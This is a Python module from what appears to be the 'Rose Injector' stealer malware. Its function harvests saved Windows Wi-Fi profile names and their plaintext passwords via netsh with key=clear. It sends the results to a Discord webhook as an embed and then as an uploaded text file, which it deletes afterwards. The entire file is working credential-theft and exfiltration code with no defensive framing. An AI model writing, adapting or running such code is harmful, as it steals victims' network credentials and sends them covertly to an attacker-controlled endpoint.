import __webhook
import _file
from config import Config
from dhooks import Embed
from dhooks import File
cc = Config()

import os
import re
import subprocess


__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))


def wifigr():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                    capture_output=True).stdout.decode()

    profile_names = re.findall("All User Profile     : (.*)\r", command_output)

    wifi_list = []

    if len(profile_names) != 0:
        for name in profile_names:
            try:
                wifi_profile = {}

                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name],
                    capture_output=True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(
                        [
                            "netsh", "wlan", "show", "profile", name,
                            "key=clear"
                        ],
                        capture_output=True,
                    ).stdout.decode("utf-8")
                    password = re.search("Key Content            : (.*)\r",
                                         profile_info_pass)

                    if password is None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile)
            except Exception as e:
                print(e)
                pass

    if len(wifi_list) > 0:
        if len(wifi_list) < 8:
            wbh = __webhook._WebhookX().get_object()
            embed = Embed(
                description="Wifi SSID and Passwords list:",
                color=16535004,
                timestamp="now",  # sets the timestamp to current time
            )

            embed.set_author(name=cc.get_name(), icon_url=cc.get_avatar())
            embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
            for value in wifi_list:
                embed.add_field(name=value["ssid"],
                                value=f"`{value['password']}`")

            wbh.send(embed=embed)

            with open(f"{__location__}/OpXOSIOF.txt", "w+",
                      encoding="utf-8") as f:
                f.write(_file.FileX().table_wifi(wifi_list))
                f.write("\n\nMade by Rose Injector | github.com/DamagingRose")

            wbh.send(file=File(f"{__location__}/OpXOSIOF.txt"))
            os.remove(f"{__location__}/OpXOSIOF.txt")
